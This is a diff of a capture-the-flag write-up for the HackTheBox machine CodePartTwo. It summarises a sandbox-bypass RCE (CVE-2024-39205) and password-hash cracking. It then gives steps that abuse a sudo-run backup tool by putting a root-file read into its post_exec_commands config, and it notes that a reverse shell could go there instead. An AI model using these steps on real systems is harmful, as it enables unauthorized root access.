@@ -1,5 +1,6 @@
 # CodePartTwo from hackthebox
-<img width="300" height="300" alt="image" src="https://github.com/user-attachments/assets/d92aba2d-bf2d-4636-aecf-f81292a43078" />
+<img width="300" height="300" alt="image" src="https://github.com/user-attachments/assets/d92aba2d-bf2d-4636-aecf-f81292a43078" /><br>
+This machines vunerable to CVE-2024-39205 bypassing sandbox using RCE we will get app user shell then from sql database we can crack password hash of another user and finally manipulating .conf file of backup tool we can get root user
 
 ## Enumeration<br>
 First I tried to gather information starting with nmap:
@@ -90,7 +91,7 @@ marco@codeparttwo:~$
 ```
 This program used with .conf config files like : `sudo /usr/local/bin/npbackup-cli -c /home/marco/npbackup.conf -b`
 
-But to exploit this we need to create our own .conf files copying everything from `npbackup.conf` and changing 2 things:
+But to exploit this we need to create our own .conf files copying everything from `npbackup.conf` and changing 2 things:<br>
 1) First copy npbackup.conf: `cp npbackup.conf test.conf`<br>
 2) Then first change Paths:
 ```bash
@@ -99,7 +100,7 @@ paths:
 ```
 change above path to `/usr/lib`<br>
 3) After that we need to change `post_exec_commands: []` to `post_exec_commands: [cat /root/root.txt > /tmp/root.txt]`
-4) Execute: `sudo /usr/local/bin/npbackup-cli -c test.conf -b`
+4) Execute: `sudo /usr/local/bin/npbackup-cli -c test.conf -b`<br>
 5) After execution I hit Ctrl+C then went to /tmp directory and retreived root flag you can write rever shell as well to get root shell:<br>
 ```bash
 marco@codeparttwo:~$ cp npbackup.conf test.conf                                                                                                                                                                                               
